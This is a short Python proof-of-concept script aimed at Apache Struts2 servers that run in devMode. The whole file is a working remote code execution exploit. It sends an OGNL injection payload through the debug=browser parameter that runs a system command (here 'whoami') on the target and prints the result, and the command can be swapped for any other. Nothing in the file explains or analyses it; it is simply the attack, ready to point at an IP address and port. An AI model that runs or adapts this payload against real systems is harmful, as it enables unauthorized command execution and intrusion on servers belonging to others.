try:
    import requests
    import os
    import logging
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)

def check(ip,port):
    try:
        url = "http://"+ip +":"+port+"/"+"/orders?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=whoami"
        get = requests.get(url,timeout=3)
        if get.status_code== 200:
            logging.info("[+] {} find s2-devMode id: {}".format(ip,get.text.strip()))
            os._exit(1)
        logging.info("[-] {} do not find s2-devMode ".format(ip))
        os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)
if __name__ == "__main__":
    import sys
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)